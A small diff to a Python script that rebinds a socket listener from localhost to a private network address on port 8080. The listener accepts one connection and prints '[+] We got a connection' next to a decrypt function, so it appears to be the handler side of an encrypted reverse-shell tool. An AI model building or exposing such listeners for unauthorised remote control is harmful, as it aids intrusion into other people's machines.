@@ -21,7 +21,7 @@ def decrypt(cipher):
 def connect():
 
     s = socket.socket()
-    s.bind(('127.0.0.1', 8080))
+    s.bind(('10.154.172.167', 8080))
     s.listen(1)
     conn, address = s.accept()
     print('[+] We got a connection')
